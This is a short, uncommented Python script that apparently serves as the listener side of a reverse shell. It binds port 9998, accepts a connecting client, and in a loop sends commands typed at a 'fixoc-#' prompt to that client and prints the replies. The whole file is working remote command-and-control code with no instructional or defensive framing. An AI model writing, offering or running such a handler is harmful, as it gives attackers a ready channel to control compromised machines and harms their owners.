import socket

s = socket.socket()

host = socket.gethostbyname("")

port = 9998


s.bind((host, port))

s.listen(2)


client,add = s.accept() 


cmd = input('fixoc-#')
while cmd != 'q':
    client.send(cmd.encode())
    response = client.recv(1024)
    print(response)
    cmd = input('fixoc-#')
